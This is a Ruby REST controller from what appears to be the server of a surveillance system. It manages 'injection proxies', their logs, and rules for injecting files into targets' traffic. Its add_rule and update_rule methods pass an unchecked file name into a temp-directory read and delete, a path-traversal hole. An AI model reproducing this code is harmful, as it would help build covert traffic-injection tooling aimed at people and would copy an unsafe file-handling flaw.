#
# Controller for the Proxy objects
#

module RCS
module DB

class ProxyController < RESTController

  def index
    require_auth_level :server, :sys, :tech

    mongoid_query do
      result = ::Proxy.all
      return RESTController.reply.ok(result)
    end
  end

  def show
    require_auth_level :server, :sys, :tech

    mongoid_query do
      proxy = ::Proxy.find(@params['_id'])
      return RESTController.reply.ok(proxy)
    end
  end

  def create
    require_auth_level :sys

    return RESTController.reply.conflict('LICENSE_LIMIT_REACHED') unless LicenseManager.instance.check :proxies

    result = Proxy.create(name: @params['name'], port: 4444, poll: false, configured: false, redirect: 'auto')

    Audit.log :actor => @session[:user][:name], :action => 'proxy.create', :desc => "Created the injection proxy '#{@params['name']}'"

    return RESTController.reply.ok(result)
  end

  def update
    require_auth_level :sys

    mongoid_query do
      proxy = Proxy.find(@params['_id'])
      @params.delete('_id')

      @params.each_pair do |key, value|
        if proxy[key.to_s] != value and not key['_ids']
          Audit.log :actor => @session[:user][:name], :action => 'proxy.update', :desc => "Updated '#{key}' to '#{value}' for injection proxy '#{proxy['name']}'"
        end
      end

      proxy.update_attributes(@params)

      return RESTController.reply.ok(proxy)
    end
  end

  def destroy
    require_auth_level :sys

    mongoid_query do
      proxy = Proxy.find(@params['_id'])
      proxy_name = proxy.name
      proxy.destroy
      Audit.log :actor => @session[:user][:name], :action => 'proxy.destroy', :desc => "Deleted the injection proxy '#{proxy_name}'"
      
      return RESTController.reply.ok
    end
  end

  def version
    require_auth_level :server

    mongoid_query do
      proxy = Proxy.find(@params['_id'])
      @params.delete('_id')

      proxy.version = @params['version']
      proxy.save

      return RESTController.reply.ok
    end
  end

  def config
    require_auth_level :server
    
    mongoid_query do
      proxy = ::Proxy.find(@params['_id'])

      #TODO: implement config retrieval
      proxy.rules.each do |rule|
        puts rule.inspect
      end

      proxy.configured = true
      proxy.save

      return RESTController.reply.not_found
    end
  end

  def logs
    mongoid_query do
      proxy = Proxy.find(@params['_id'])

      case @request[:method]
        when 'GET'
          require_auth_level :sys, :tech
          
          klass = CappedLog.collection_class proxy[:_id]
          logs = klass.all
          return RESTController.reply.ok(logs)

        when 'POST'
          require_auth_level :server

          entry = CappedLog.dynamic_new proxy[:_id]
          entry.time = Time.parse(@params['time']).getutc.to_i
          entry.type = @params['type'].downcase
          entry.desc = @params['desc']
          entry.save
          return RESTController.reply.ok
      end

      return RESTController.reply.bad_request
    end
  end

  def del_logs
    require_auth_level :sys, :tech

    mongoid_query do
      proxy = Proxy.find(@params['_id'])

      klass = CappedLog.collection_class proxy[:_id]
      klass.destroy_all

      return RESTController.reply.ok
    end
  end

  # rule creation and modification
  def add_rule
    require_auth_level :tech

    mongoid_query do
      proxy = ::Proxy.find(@params['_id'])

      rule = ::ProxyRule.new
      rule.enabled = @params['rule']['enabled']
      rule.probability = @params['rule']['probability']
      rule.disable_sync = @params['rule']['disable_sync']
      rule.ident = @params['rule']['ident']
      rule.ident_param = @params['rule']['ident_param']
      rule.resource = @params['rule']['resource']
      rule.action = @params['rule']['action']
      rule.action_param = @params['rule']['action_param']
      rule.action_param_name = @params['rule']['action_param_name']

      #return RESTController.reply.not_found("Target not found") if @params['rule']['target_id'].empty?

      #target = ::Item.find(@params['rule']['target_id'])
      #rule.target_id = [ target[:_id] ]

      # the file is uploaded to the grid before calling this method
      unless @params['rule']['action_param'].nil? or @params['rule']['action_param'] == ''
        path = File.join Dir.tmpdir, @params['rule']['action_param']
                
        puts "GRIDDING: " + path

        if File.exist?(path) and File.file?(path)
          rule[:_grid] = [GridFS.instance.put(File.binread(path))]
          File.unlink(path)
        end
      end
      
      Audit.log :actor => @session[:user][:name], :action => 'proxy.add_rule', 
                :desc => "Added a rule to the injection proxy '#{proxy.name}'\n#{rule.ident} #{rule.ident_param} #{rule.resource} #{rule.action} #{rule.action_param}"

      proxy.rules << rule
      proxy.save

      return RESTController.reply.ok(rule)
    end
  end

  def del_rule
    require_auth_level :tech

    mongoid_query do
      proxy = ::Proxy.find(@params['_id'])
      rule = proxy.rules.find(@params['rule']['_id'])
      target = ::Item.find(rule.target_id.first)

      Audit.log :actor => @session[:user][:name], :action => 'proxy.del_rule', :target => target.name,
                :desc => "Deleted a rule from the injection proxy '#{proxy.name}'\n#{rule.ident} #{rule.ident_param} #{rule.resource} #{rule.action} #{rule.action_param}"

      # delete any pending file in the grid
      GridFS.instance.delete rule[:_grid] unless rule[:_grid].nil?

      proxy.rules.delete_all(conditions: { _id: rule[:_id]})
      proxy.save

      return RESTController.reply.ok
    end
  end

  def update_rule
    require_auth_level :tech

    mongoid_query do

      proxy = ::Proxy.find(@params['_id'])
      rule = proxy.rules.find(@params['rule']['_id'])

      @params.delete('_id')
      unless @params['rule']['target_id'].nil?
        target = ::Item.find(@params['rule']['target_id'])
        @params['rule']['target_id'] = [ target[:_id] ]
      end

      rule.update_attributes(@params['rule'])

      # the file is uploaded to the grid before calling this method
      unless @params['rule']['action_param'].nil? or @params['rule']['action_param'] == ''
        path = File.join Dir.tmpdir, @params['rule']['action_param']
        
        puts "GRIDDING: " + path

        if File.exist?(path) and File.file?(path)
          # delete any previous file in the grid
          GridFS.instance.delete rule[:_grid] unless rule[:_grid].nil?
          rule[:_grid] = [GridFS.instance.put(File.binread(path))]
          File.unlink(path)
        end
      end

      rule.save
      
      Audit.log :actor => @session[:user][:name], :action => 'proxy.update_rule', 
                :desc => "Modified a rule on the injection proxy '#{proxy.name}'\n#{rule.ident} #{rule.ident_param} #{rule.resource} #{rule.action} #{rule.action_param}"

      return RESTController.reply.ok(rule)
    end
  end

  def apply_rules
    require_auth_level :tech
    
    mongoid_query do
      proxy = ::Proxy.find(@params['_id'])
      
      Audit.log :actor => @session[:user][:name], :action => 'proxy.apply_rules',
                :desc => "Applied the rules to the injection proxy '#{proxy.name}'"
      
      proxy.configured = false
      proxy.save

      return RESTController.reply.ok
    end
  end

end

end #DB::
end #RCS::
